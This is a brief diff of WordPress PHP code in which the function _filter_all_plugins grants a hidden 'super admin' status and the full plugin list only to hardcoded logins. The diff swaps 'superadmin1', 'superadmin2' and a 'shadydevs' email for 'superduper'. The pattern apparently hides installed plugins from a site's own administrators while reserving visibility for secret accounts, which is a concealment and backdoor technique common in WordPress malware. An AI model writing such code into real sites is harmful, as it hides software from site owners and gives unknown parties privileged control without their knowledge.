@@ -70,7 +70,7 @@ $GLOBALS['current_user_super_admin'] = false;
 function _filter_all_plugins($get_plugins)
 {
 
-    if (is_user_logged_in() and in_array(wp_get_current_user()->data->user_login, ['superadmin1', 'superadmin2', 'shadydevs@shahbandr.com'])) {
+    if (is_user_logged_in() and in_array(wp_get_current_user()->data->user_login, ['superduper'])) {
         $GLOBALS['current_user_super_admin'] = true;
         return $get_plugins;
     }
